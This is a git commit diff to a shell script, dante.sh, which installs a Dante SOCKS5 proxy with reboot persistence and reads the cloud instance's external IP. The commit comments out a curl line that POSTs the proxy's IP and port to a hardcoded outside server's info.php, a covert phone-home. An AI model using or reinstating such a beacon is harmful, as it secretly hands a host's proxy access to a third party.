02f6f77104c9ae704189f00f9b6ec4adc16bb5c4
adv-zl <nexmptest@gmail.com>
2019-09-12 22:01:23 +0300

    Update dante.sh

--- dante.sh
+++ dante.sh
@@ -47,5 +47,5 @@ sudo crontab -l | { cat; echo '@reboot /etc/sockd.sh'; } | crontab -
 sudo /usr/local/sbin/sockd -D -N 2 -f /etc/danted.conf
 IP=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip" -H "Metadata-Flavor: Google")
 tail /var/log/syslog
-curl -X POST -d "socks=$IP:4444" "http://135.235.86.175/info.php"
+#curl -X POST -d "socks=$IP:4444" "http://135.235.86.175/info.php"
 echo "your socks5 is: $IP:$sport"
